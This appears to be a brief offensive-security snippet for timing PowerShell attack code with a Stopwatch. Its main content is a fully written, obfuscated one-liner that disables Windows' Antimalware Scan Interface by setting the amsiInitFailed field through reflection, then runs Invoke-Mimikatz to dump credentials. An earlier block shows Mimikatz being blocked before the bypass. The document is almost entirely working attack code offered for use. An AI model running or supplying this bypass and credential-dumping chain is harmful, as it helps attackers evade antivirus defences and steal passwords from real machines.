Using the measure / stopwatch ability in powershell to break it 

The code is not very complex

```powershell
$StopWatch = [diagnostics.stopwatch]::startNew()
#HERE IS YOUR AMSI BYPASS#
#HERE IS YOUR PAYLOAD#
#Other stuff as required
$StopWatch.ElapsedMilliseconds
```
as a one liner, it would look like this
```powershell
$StopWatch = [diagnostics.stopwatch]::startNew() ; <#HERE IS YOUR AMSI BYPASS##HERE IS YOUR PAYLOAD#> ; $StopWatch.ElapsedMilliseconds
```


## Example

### Check for AMSI

```powershell
PS C:\Users\c> invoke-mimikatz
At line:1 char:1
+ invoke-mimikatz
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

### Run One
```powershell
$StopWatch = [diagnostics.stopwatch]::startNew() ;  S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ) ; Invoke-Mimikatz ; $StopWatch.ElapsedMilliseconds
```
